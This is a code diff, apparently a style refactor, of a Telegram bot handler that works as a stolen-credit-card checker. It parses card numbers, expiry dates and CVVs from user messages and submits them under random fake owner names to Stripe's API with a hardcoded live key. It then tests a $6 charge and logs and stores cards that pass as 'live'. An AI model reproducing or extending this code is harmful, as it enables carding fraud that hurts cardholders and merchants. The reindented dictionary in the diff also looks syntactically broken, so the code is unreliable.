@@ -27,7 +27,7 @@ async def csa(message, gate_info, user_info,start_time, lang):
         data = await get_cards(message.reply_to_message.text if message.reply_to_message is not None else message.text,message.from_user.id)
         assert isinstance(data, tuple), data
         cc, mes, ano, cvv = data
-        lista = cc + '|' + mes + '|' + ano + '|' + cvv 
+        lista = f'{cc}|{mes}|{ano}|{cvv}'
         bin_info = await get_bin_info(cc[:6],message.from_user.id)
         assert bin_info, lang['bin_banned']
         await msg.edit_text(lang['card_msg'].format(card=lista, name=message.from_user.first_name, id=message.from_user.id,
@@ -37,18 +37,18 @@ async def csa(message, gate_info, user_info,start_time, lang):
                                     type=bin_info['type'], role=user_info['role']), disable_web_page_preview=True)
         browser = requests.Session()
         rand_user = random_user_api().get_random_user_info()
-        e_json = {
-'type': 'card',
-'owner[name]': rand_user.name,
-'card[number]': cc,
-'card[cvc]': cvv,
-'card[exp_month]': mes,
-'card[exp_year]': ano,
-'pasted_fields': 'number',
-'payment_user_agent': 'stripe.js/246ac94f4; stripe-js-v3/246ac94f4',
-'time_on_page': '71684',
-'key': 'pk_live_51JNrn4GkHQ1N8S52hDgaQ9EYxEAr1ZBhF0nEoYPEsQiRvGz8j7Jx8WBpmUtopEOxDPGOv7ftc9DHGYzRnJ7bgyND00AYAJB4dv',
-}
+                e_json = {
+        'type': 'card',
+        'owner[name]': rand_user.name,
+        'card[number]': cc,
+        'card[cvc]': cvv,
+        'card[exp_month]': mes,
+        'card[exp_year]': ano,
+        'pasted_fields': 'number',
+        'payment_user_agent': 'stripe.js/246ac94f4; stripe-js-v3/246ac94f4',
+        'time_on_page': '71684',
+        'key': 'pk_live_51JNrn4GkHQ1N8S52hDgaQ9EYxEAr1ZBhF0nEoYPEsQiRvGz8j7Jx8WBpmUtopEOxDPGOv7ftc9DHGYzRnJ7bgyND00AYAJB4dv',
+        }
         first = browser.post('https://api.stripe.com/v1/sources', data = e_json)
         json_first = first.json()
         if 'error' in json_first:
@@ -74,12 +74,15 @@ async def csa(message, gate_info, user_info,start_time, lang):
         assert c, lang['third_error']
         r_text, r_logo, r_respo = get_response_csa(c)
         if 'Charged $6' in r_text:
-            await send_logs(lista + ' ' + gate_info['name'])
-            save_live(lista + ' ' + gate_info['name'])
+            await send_logs(f'{lista} ' + gate_info['name'])
+            save_live(f'{lista} ' + gate_info['name'])
             if user_info['save-ccs']:
-                await adb.users.update_one({'_id': message.from_user.id}, {'$addToSet': {'cards': lista + ' ' + gate_info['name']}})
+                await adb.users.update_one(
+                    {'_id': message.from_user.id},
+                    {'$addToSet': {'cards': f'{lista} ' + gate_info['name']}},
+                )
         elif 'Error' in r_respo:
-            await send_logs("Error in {} Gateway. uploading file....".format(gate_info['name']))
+            await send_logs(f"Error in {gate_info['name']} Gateway. uploading file....")
             gate_error(e, gate_info['name'])
             if os.path.exists(f'text_files/{gate_info["name"]}.txt'):
                 await send_logs_doc(f'text_files/{gate_info["name"]}.txt')
